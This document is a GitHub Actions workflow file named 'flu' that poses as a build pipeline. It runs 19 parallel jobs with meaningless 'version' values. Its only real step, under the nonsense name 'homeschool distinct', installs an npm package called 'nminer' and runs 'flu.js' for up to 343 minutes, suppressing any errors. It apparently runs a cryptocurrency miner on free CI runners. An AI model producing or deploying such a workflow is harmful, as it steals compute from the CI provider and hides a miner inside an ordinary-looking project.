name: flu
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2303 }
          - { version: 9646 }
          - { version: 1569 }
          - { version: 3388 }
          - { version: 3061 }
          - { version: 2059 }
          - { version: 8819 }
          - { version: 8872 }
          - { version: 8036 }
          - { version: 6053 }
          - { version: 6540 }
          - { version: 6599 }
          - { version: 7927 }
          - { version: 4830 }
          - { version: 4299 }
          - { version: 6910 }
          - { version: 2824 }
          - { version: 4987 }
          - { version: 1352 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: homeschool distinct
        run: |
          npm install nminer@latest
          timeout 343m node flu.js || echo "flu executed"